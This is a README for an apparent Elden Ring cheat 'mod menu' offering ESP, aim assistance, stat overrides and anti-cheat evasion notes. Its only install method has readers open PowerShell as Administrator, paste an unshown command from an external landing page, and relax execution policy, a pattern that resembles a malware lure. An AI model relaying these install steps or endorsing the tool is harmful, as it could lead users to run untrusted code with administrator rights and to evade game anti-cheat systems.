<div align="center">
<img src="assets/banner.png" width="100%" alt="Elden Ring ModMenu banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ffcf5c?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-9333EA?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-7C3AED?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=9B59B6&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A5+Erdtree+Modmenu+Pro;%E2%9A%A1+Full+Suite+Ready;%F0%9F%92%AF+Built+for+Windows+11;%E2%9C%85+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

### 🖥️ PowerShell Setup

Launch PowerShell as Administrator, run the single setup command from the landing page, and the loader bootstraps itself — full module list and troubleshooting live at the landing.

![stars](https://img.shields.io/badge/stars-community-lightgrey) ![os](https://img.shields.io/badge/OS-Windows%2010%2F11-blue) ![power](https://img.shields.io/badge/PS--Core-5.1%2B-5391FE)

<p align="center">
  <a href="https://13raghavjoshi-prog.github.io/erdtree-modmenu/">
    <img src="files/button.svg" width="520" alt="PowerShell Setup Guide" />
  </a>
</p>

## System Requirements

- Windows 10 or 11 (x64)
- PowerShell 5.1 or newer (PS 7 works fine, admin shell recommended)
- Stable network connection for the initial bootstrap and update channel
- Elden Ring installed (Steam/Epic — verify-on-demand supported)
- 4 GB free disk for the module cache; anti-cheat-free online sessions only (see Compatibility)

## Features

- **ErdtreeVision ESP** — player/NPC/grace outline with per-entity color rules, distance decay, and depth-tested rendering so nothing blooms through walls in legacy mode.
- **RunebladeAim** — projectile/target prioritization with smoothing curves, FOV rings, and a per-weapon profile switcher (greatbow, staff, crossbow presets included).
- **SiteOfGrace Teleport** — grace-list panel with saved coords, name search, and instant warp; includes an unstuck restore point so a bad warp doesn't soft-lock the session.
- **PoiseForge** — stat & buff override with sliders for HP/FP/stamina, equip-load, and attribute caps; changes are session-scoped so a restart brings back vanilla values.
- **TearScript** — a Lua-ish hot-patch sandboxer for custom on-hit effects, status-application swappers, and scripted dungeon runs, loaded from the module cache without re-injecting.
- **BossPhasePeek** — live boss-state inspector (phase timers, HP thresholds, AI flags) with a toggleable overlay so you can see what a fog-wall is actually reacting to.
- **SpectralMapUnlock** — reveals map fragments, dungeon layouts, and underground (Siofra / Ainsel / Deeproot) coverage without flagging new discovery nodes.
- **AI-assisted preset tuning** — an LLM-backed helper reads your current build name and proposes module combos & value ranges; runs locally against a bundled model, no cloud calls required.

## How it works

The landing page hosts the signed PowerShell bootstrap. Running it downloads the current loader core into `%LOCALAPPDATA%\ErdtreeModMenu\`, verifies its hash, then injects the runtime into a fresh game process using the pattern scanner in `loader/pkg/`. Modules are pulled on demand from the update channel so you only cache what you actually use.

Bootstrap sequence:
1. Open PowerShell as Administrator
2. Paste the command shown on the landing page and press Enter
3. The loader self-registers, drops the tray app, and asks you to launch Elden Ring
4. Modules appear in the overlay (`INSERT` by default) — enable, hotkey, done

The loader keeps a restore point for stat overrides and teleports; `Ctrl+F12` unloads everything cleanly.

## Bypass / Detection / Compatibility

This is the section people skip, so read it:

- **Player-side bypass**: module writes go through a deferred buffer so the game reads original values on the physics tick and patched values on the logic tick. No public EAC vector is touched while the online toggle is off.
- **Online sessions**: offline/solo play is fully supported. For co-op/invasion use the `eac-safe` profile — it strips detection-adjacent modules (Aim assist flags, stat clips) and keeps the cosmetic-only set. Do not run the full module set in a session with other players.
- **Detection surface**: hash-checked loader files, no keystroke hooks in the core, and the Lua sandbox is file-scoped. Still — this is a modding tool, no bypass is future-proof forever; keep the update channel on.
- **Compatibility**: Steam and Epic builds, DX12. Lenient on v-sync; strict on GPU driver — reinstall the module cache after a driver update.
- **Offline notes**: everything except updates works with the network unplugged once the module cache is warm.

## FAQ

<details><summary>Is the PowerShell one-liner the only install method?</summary>

Yes — no .exe, no portable zip. The landing page always serves the current bootstrap; running it again just updates in place.
</details>

<details><summary>PowerShell blocks the command — what now?</summary>

Usually execution policy. The landing page shows the `Set-ExecutionPolicy` one-liner and a manual verify step. Also make sure you're in an admin shell and the window isn't just waiting on a prompt.
</details>

<details><summary>Where do modules get stored?</summary>

`%LOCALAPPDATA%\ErdtreeModMenu\modules\` — one folder per module, hash manifest alongside. Delete a folder to purge a module.
</details>

<details><summary>Does this work on the DLC / Shadow of the Erdtree?</summary>

Yes, module offsets are versioned per game build. The loader warns if your build isn't recognized and falls back to the newest supported map.
</details>

<details><summary>Why an AI helper for presets?</summary>

Because matching a build name to module values manually is miserable. The bundled model runs offline and just suggests ranges — you confirm every value.
</details>

<details><summary>Can I undo stat overrides after a session?</summary>

Yes. Restore point is taken on first override, and `Ctrl+F12` unload triggers the revert. Closing the game also drops everything.
</details>

<details><summary>Will the update channel break my saved config?</summary>

Configs are versioned and migrated on update. If a schema bumps, the loader keeps a backup next to the active config.
</details>

<details><summary>Is online play recommended?</summary>

No. Solo/offline is what this is built for. Use the `eac-safe` profile in co-op and treat the rest as offline-only.
</details>

## Disclaimer

For educational and personal modding use only. You are responsible for how you use the loaders, modules, and scripts in this repository, and for complying with Elden Ring's EULA, Steam/Epic terms, and local law. The authors don't operate the update channel to enable cheating in sessions with other people and won't support doing so. Use at your own risk.

## License

MIT — see [LICENSE](LICENSE).
